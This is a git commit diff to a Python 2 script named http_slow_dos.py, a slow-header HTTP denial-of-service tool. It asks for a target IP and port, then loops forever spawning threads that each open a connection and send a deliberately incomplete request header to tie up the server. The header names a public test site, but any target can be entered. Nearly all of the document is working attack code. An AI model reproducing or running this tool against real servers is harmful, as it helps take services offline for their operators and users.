751ebfb9948f73c65047737d6eee29baa3ed9498
Sumit Shrivastava <c0d3sh3lf@gmail.com>
2016-07-31 16:10:18 +0400

    Add files via upload

--- http_slow_dos.py
+++ http_slow_dos.py
@@ -8,15 +8,19 @@ __version__ = "1.0.0b"
 
 
 def open_conn(ip_address, port):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((ip_address, port))
-    header = "GET /index.php HTTP/1.1\r\nPragma: no-cache\r\nCache-Control: no-cache\r\nHost: testphp.vulnweb.com\r\nConnection: Keep-alive\r\nAccept-Encoding: gzip,deflate\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36\r\nAccept: */*\r\n"
-    s.send(header)
+    s = socket.socket()
+    try:
+        s.connect((ip_address, port))
+        print "[+] Initiating connection...\n\r"
+        header = "GET / HTTP/1.1\r\nPragma: no-cache\r\nCache-Control: no-cache\r\nHost: testphp.vulnweb.com\r\nConnection: Keep-alive\r\nAccept-Encoding: gzip,deflate\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36\r\nAccept: */*\r\n"
+        s.send(header)
+    except:
+        print "Unable to open a connection."
 
 
 def main():
-    ip_address = raw_input("Enter Target IP : ")
-    port = raw_input("Enter Target HTTP port : ")
+    ip_address = str(raw_input("Enter Target IP : "))
+    port = int(raw_input("Enter Target HTTP port : "))
     try:
         while (True):
             thread.start_new_thread(open_conn, (ip_address, port))
